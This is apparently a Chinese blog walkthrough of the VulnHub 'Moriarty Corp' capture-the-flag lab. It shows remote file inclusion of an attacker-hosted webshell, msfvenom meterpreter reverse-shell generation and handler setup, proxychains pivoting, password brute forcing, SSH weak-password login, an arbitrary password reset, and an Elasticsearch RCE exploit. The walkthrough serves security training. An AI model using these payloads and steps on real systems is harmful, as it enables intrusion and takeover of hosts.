> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NsvsuX7rUv0GPW4xd7ckpQ)

点击上方 “蓝字” 关注公众号获取最新信息!

> 本文作者：betaseclabs（贝塔安全实验室）  

Moriarty Corp 靶场环境包含一台外网服务器和三台内网主机，攻击者需先对外网服务器进行 web 攻击，依据提交 flag 后的提示信息，逐步获取内网主机权限。本次靶场环境包含以下 10 个关键部分：  

| 

*   靶场环境
    

 | 

*   暴力破解
    

 |
| 

*   主机发现
    

 | 

*   文件上传
    

 |
| 

*   文件包含
    

 | 

*   SSH 弱口令
    

 |
| 

*   payload 反弹
    

 | 

*   任意密码修改
    

 |
| 

*   添加代理
    

 | 

*   远程代码执行
    

 |
| 

*   内网探测
    

 | 

*   个人总结
    

 |

**1.  靶场环境**
------------

本次所使用的攻击机为 kalilinux 系统，攻击过程中涉及到的工具主要有：公网主机 VPS，中国菜刀 / 中国蚂剑，burpsuite，msf，MobaXterm，一句话木马，proxychains，nmap，searchsploit，exp 脚本等。攻击的拓扑结构如下图所示。  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ89j9jRBrUpg4cH9WRQASsbuLH32nJaFcmvl9pNuyK1cCVN3mUkvtTg/640?wx_fmt=png)

**注意:** 外网服务器 (8000 端口) 为提交 flag 以及攻击提示处，并不存在漏洞，请不要进行攻击行为。Flag 的存储格式为 #_flag.txt，通常存储在服务器的不同目录下面。每次提交 flag 后都会给相关提示和说明。开始渗透之前须向外网服务器 (8000 端口) 提交 flag{start}，表示攻击开始正常启动。本次实验的虚拟机采用 virtual box.

**详细靶场说明请参考：**

https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/

靶场下载地址：

Download (Mirror):

https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova

Download (Torrent):

 https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent

**2.  主机发现**
------------

通过 arp(地址解析协议) 进行局域网内主机发现，arp 是根据 IP 地址获取物理地址的一个 TCP/IP 协议。主机发送信息时将包含目标 IP 地址的 ARP 请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该 IP 地址和物理地址存入本机 ARP 缓存中并保留一定时间。

```
>>> namp -sn -PR -T 4192.168.124.0/24
```

    -sn：只进行主机发现，不进行端口扫描。  

    -PR：ARP Ping。

    -T：指定扫描过程使用的时序，总有 6 个级别（0-5），级别越高，扫描速度越快，在网络通讯状况较好的情况下推荐使用 T4。  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZgE66O6ic4zlAmiaib5AB0y7nlfrLS35uRG8Ot2UQtXunJ8zS36RzAPJiaw/640?wx_fmt=png)

**3.  文件包含**
------------

通过访问页面 http://IP/file=name.html，可猜测为目录遍历或者文件包含漏洞，如下为漏洞验证结果。

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ8icQfzzYnr7DiaHrAZImXnAzkNtVSo3dNUf0PPIdQevzzHzup9bddVVw/640?wx_fmt=jpeg)

文件包含漏洞，通常分为本地文件包含和远程文件包含。本地文件包含，通常需要能够写入 webshell 的文件进行包含，进而获取 shell 权限。远程文件包含，可对远程写入 webshell 的文件进行包含，获取 shell 权限。如下为远程服务器 test.txt 文件写入 phpinfo();

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZlHI09iaTm7WAibgPdKicMIXsV2IcsfFUZnlLSyu0gGXPBJhDGicpD0aJCg/640?wx_fmt=png)

访问页面对远程主机的 test.txt 文件进行包含，验证远程文件漏洞真实存在。这样可以在远程服务器写入 webshell 进行包含，进而获取 Moriarty Corp 服务器的主机 shell 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ3cVg9cPcJ3B759Sjarj9z1gWZvdUVV5ia7ym0HY5c0v5snJxhxs5fsg/640?wx_fmt=png)

如下所示，通过菜刀直接连接后，可以获取到 shell 权限。通过查看目录, 在根目录查看到 1_flag.txt。

木马文件链接地址：http://192.168.124.14/?file=http://xx.xx.xx.xx/snail.txt

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZLcxl4iaFmT1pemhWTueTJiamyKS8seyKVAKfLA3MOjflY6D6F097ZFUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ5fKxYy5Rm9EgjqRLmwYib3Xtfb7oAasQicoibgTYqq91Oc19vcfClQQAA/640?wx_fmt=png)

将获取到的 flag 内容进行提交后，Moriarty Corp 靶场给出新的提示。如下图所示，提示内网环境中存在重要的网站，里面存在要获取的 flag 信息，并且告知内网范围在 172.17.0.3-254 段。由此，开始步入后渗透攻击阶段，由于靶场环境主要以 linux 系统环境为主，故此处后渗透工具在此处选择 metasploit 工具为主。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZCZq9Nt2hibg7AjSIOBQu5ZIMmosyqBa82HXd4fc8ia1oqN35jicKe2kPA/640?wx_fmt=png)

**4.Payload 反弹**
----------------

攻击机进行监听设置 (注意：监听主机设置需要与生成的 payload 保持一致)：

```
>>> useexploit/multi/handler
>>> set payloadslinux/x64/meterpreter_reverse_tcp
>>> set LHOST192.168.124.15        #监听主机ip地址
>>> set PORT 9999                  #监听主机端口号
>>>exploit -j
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZHo9dA3Fd7PUxynSjy5DBvWfLy0JeOgH5vNccibv1eDnx7PzbuVuibgqg/640?wx_fmt=png)  

生成反弹需要的 payload 文件：

```
>>> msfvenom -plinux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

 ![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZrdp8JAlQLXD3douRgu7BEy0ewRLbqD1lic5PpE3s8oXE7BU93AT5qiag/640?wx_fmt=png)

将生成的文件上传到目标主机，并更改 payload 可执行权限，并执行。

```
>>> chmod 777 shell.elf
>>> ./shell.elf
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZBLiab2iar0EU7kt40m66APLx8wFTI1D8aXJltjJgs2y5Ra78Ia7zWiang/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZpejzku0NJp9JaBXCj9CRhxA8BL3Z8IZOrOBc7LaVHx4x3Ry1tz2DzQ/640?wx_fmt=png)

在攻击端，监听的主机收到目标主机反弹的 shell 权限，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZjhQM6AFDgB7B3JPxT711ialyUAL6pcyZ3sQclzv5djvsSBl85usEM5Q/640?wx_fmt=png)  

**5.  添加代理**
------------

根据提交 flag 后系统反馈的提示说明，需要我们对内网的 web 应用网站进行渗透攻击，此时为了能够访问到内网，需要进行添加代理操作。查看当前路由有一个内网段 ip 地址段位 172.17.0.0/24。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZUTqqMMa9z5tkucAGkYxvgZAkhjsvktn7IibdKAkr3Rj90cKpf0cb0Ug/640?wx_fmt=png)

执行指令添加路由操作。

```
>>>run autoroute -s 172.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ658dh9COfmWsESAibMKxpsDEM2D9WBFianFgSs6wlD4CCT4YhEcODxMQ/640?wx_fmt=png)  

添加 socks5 代理：

```
>>>use auxiliary/server/socks5
>>>run
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZBgC2e9CwKGXgjp0SZ01sahKfomSs5EGoPkkq6icuHe0RFd6OMdMx8lQ/640?wx_fmt=png)

此处应用 proxychains 工具，进行内网探测，使用编辑器在文件 / etc/proxychains.conf 的最后一行加入 socks5 代理的配置信息。  

| 

```
---  snippet ---
[ProxyList]
#  add proxy here ...
#  meanwile
#  defaults set to "tor"
socks5  127.0.0.1 1080
```



 |

**6. 内网探测**
-----------

通过执行代理工具 proxychains，对 Moriarty Corp 内网 web 服务进行探测，可以发现主机 ip 地址为 172.17.0.4。执行指令如下所示：

```
>>>Proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p80
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZl4lVdMzr8kkVvFGASlO36D0ygnBiaiccgywic8ibQqhMbFtQzl6kM30FVA/640?wx_fmt=png)

**7. 暴力破解**
-----------

此时通过浏览器是不能访问到内网服务器，需要在浏览器配置代理进行访问，配置代理类型选择 socks5，本地端口为 1080。配置好以后，就能通过代理访问内网 web 应用了。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZgd1PiabgqrODX5w9xJsd7WBS7yYFO55Stey92x1IwFYqFMXa9vwZYRg/640?wx_fmt=png)

通过浏览页面可发现，为一个文件上传页面，但是上传需要输入口令，方可操作成功。此时考虑可通过 burpsuite 进行拦截后，口令破解。

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZHnicF7c8d3vn9iaZIO8Lo8Ep2fNXA31AhWzSe0KBD66MGjOVWWppbkcg/640?wx_fmt=jpeg)

打开 burpsuite 后，需要添加代理，这样才能将拦截到的数据正确发送到目标服务器，配置过程如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ8C5qfHkGDVV1npjWGcQaZcFevCyQ1OibwhWJuyBqKwkbLKhykENTUCg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZJDibSDFSkHHiaEiaZ6ClxN8lcs0iahbu5ricHVrzbwDaf9SXaBkoTUqXuuA/640?wx_fmt=png)

对拦截的数据更改口令字段，添加常用字典，此处用的字为：top1000.txt。查看破解成功字段的真实口令为 password。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ0yvpYG7Rbd3RBw0Qx8LokhUCsfU5mReLd1yvQTcHG3ZdRj8csEEedw/640?wx_fmt=png)  

**8. 文件上传**
-----------

如下图所示，成功将木马上传至服务器：

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZQpYD3dCPiccSnYR35X7S1UiaMR4SZicic3su4ek5lT9uXxmS3Okck0TSCA/640?wx_fmt=jpeg)  

常用的菜刀，Cknife 等工具并不存在代理功能，此处使用中国蚁剑工具进行连接，配置蚁剑代理如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZia3tl5EHhbTKiaflboiaHj4EicXKGbGHpv4zQfqUpqy219LMAtGbichS27Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZMibhUOCsjiczSxA5EUvaicaDmdhicVWXos7PgJksVUouLwB28utInfDNTg/640?wx_fmt=png)

成功连接到内网的 shell 后，访问目标系统不同目录，获取第二个 flag 文件：2_flag.txt

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZktZoB8T8desMWAZmGOOUsnEQYp2DGIkaayx3iazHiahFQ3zdK6vWH87Q/640?wx_fmt=png)  

**9. SSH 弱口令**
--------------

将获取到的 flag 内容进行提交后，Moriarty Corp 靶场给出新的提示。如下图所示，给出几个用户名和密码 hash 值。对内网中的 ssh 服务进行弱口令猜解。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZEtYybEy3s0WROwC0XQqZKwG24BxqFZueMEjCAPSXDgoeVMdAgyB2kA/640?wx_fmt=png)

通过第三方网站，对给出的 hash 值进行破解，如下所示为破解的 hash 结果：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZmeyvAjr7TZx3fcA0h4sLl1PRYwJxxrHxWuemcZdHK2dcVIGVRsjXaw/640?wx_fmt=png)

对内网的 22 端口进行探测，发现主机 172.17.0.8 开放 22 端口，并对该内网主机进行 ssh 弱口令猜解。

```
>>>proxychains nmap -sV -t -Pn -p22 127.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZSSO9GKucU3VX0qz5xMZjryiasglr0IT5vdCP3SHYmCEu16qGZokoRibg/640?wx_fmt=png)

通过第三方工具 MobaXterm 添加代理后，远程连接到内网主机，具体操作过程如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZUjomnJNIVpvElYHTrA3O4TTA8RM1qTiaZtu1qn08EktrtPrlywvpyKQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZye0BZw5qQ5rR5GPW8vAZia7vbfSibfTIu1ncsxmXCY9TjuYxJ8UMhEVw/640?wx_fmt=png)  

猜解成功后，获得当前内网主机的基本权限，访问目录后的 3_flag.txt。查看并进行提交。  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZHKs3A3FrNoqZia9GhyXl0qibA4VpicialaYmm943liaz9xg7H76LU9L02BQ/640?wx_fmt=png)

**10. 任意用户密码修改**

将获取到的 flag 内容进行提交后，Moriarty Corp 靶场给出新的提示。如下图所示，提示说存在一个聊天网站，管理员的聊天记录可能存在有价值的信息。并给出服务器开放端口可能在 443，8000，8080，8888。  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZP1XXMlpgBekbxWZlgStLQsBf5ZN141tibZAdJFQGQdkbjLRQxEnNYaA/640?wx_fmt=png)  

对内网的 443，8000，8080，8888 端口进行探测，发现主机 172.17.0.9 开放 8000 端口，并对该内网主机 web 应用进行访问。

```
>>>proxychains nmap -sV -t -Pn -p443,8000,8080,8888 127.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ0PficaW60s71HvibFkzjhIPGiaiaOTYYIF7QZefR95BiaRZZNJnAExK6iaTw/640?wx_fmt=png)

根据提示给出的用户名和口令进行登陆，查看网站具有两个功能，可以查看 chats 聊天记录，可以更改用户名密码。尝试抓包，通过更改用户名为管理员，设置口令。此时如果存在任意用户名口令更改漏洞，此时就可以把管理员登陆密码从新设置。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZRnzULhcW7HG8rib5ribk1Su7OoXALB3y66b7r3CVupywnIUVxkYFQfEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZOIIQ2KqATbv5ZHJ95KN7clLcicRib19Y4zP2DiaOTI6z9EWlibvSuZZwYg/640?wx_fmt=png)

更改后，便可以以管理员身份进行登陆了。通过访问 chats 可以查看到另外一个 flag 信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZZK1VxqysQDNKPnbfCV3mvYC5RNbnq249KxHgvQAH9ibJcKNcNJPlogw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ5YsFhxud8AGDD1wuOyTYQ4iatMjKBNV2icHibjJ5HBwmEsNoy0KAICp9A/640?wx_fmt=jpeg)

将获取到的 flag 内容进行提交后，Moriarty Corp 靶场给出新的提示。如下图所示，文中提到一个 web 应用 Elasticsearch。尝试百度查询了一下，该服务默认运行在 9200 端口，并存在框架漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZNCBnNYfv08Xnur7BD4NiaIicFhSWL3CqHYY1ev7RrWBdaCmEWmw3ia2KQ/640?wx_fmt=png)

**11. 远程代码执行**
--------------

对内网的 9200 端口进行探测，发现主机 172.17.0.10 开放 9200 端口，并对该内网主机 web 应用进行访问。

```
>>> proxychains nmap -sV  -sT  -Pn -p9200 127.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZnE0BfdLvwblGrtK9ziavAzoBcGRLpiah43qZTiaGxg8rtVh5PLvdaNdaw/640?wx_fmt=png)

依据 kali 自带功能 searchsploit 功能进行版本漏洞搜索：

```
>>>searchsploit elasticsearch
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZJXMaSg4SBicgd0BjqRA6vVEISH0ic3MflM5gmSBH9Z5z4Byw8CYH6iccQ/640?wx_fmt=png)

使用 36337.py 脚本执行远程代码执行攻击，获取 shell 权限

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ9fBM9q6SYRM1oDtpmnRCeUl7F6HIpNy3IqQvf8giaqbPA4Oej9kFqMA/640?wx_fmt=png)

通过查看目标主机目录，获取 flag 信息 6_flag.txt。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZkPbyIYeMIARSy5e40iantoEondHujk6M983eJGAHLwTOLDSbpmLQFkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZh1n3ME8T3hTnyHCqgA9Au2icrt04VAMXVNIzPblAIls7N5EBRykzRgA/640?wx_fmt=png)

**12. 个人总结**
------------

Moriarty Corp 靶场涉及到了 web 攻击到内网漫游的基本环节，在每一个相关环节作者都给予了提示，漏洞利用方式较为简单。提交完漏洞结束后，就像服务器提示所说被拉入黑名单了，再次访问发现已被拉黑。

- 往期推荐 -

  

[靶场攻略 | 某大学实战靶场记录](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247491553&idx=1&sn=b0defa393f09e0747ae7862a4c6e5143&chksm=cf4d9080f83a1996e89969a710f4d87b75c1b412ce659caa401c4d19a60759b2f184819caa0e&scene=21#wechat_redirect)  

**【推荐书籍】**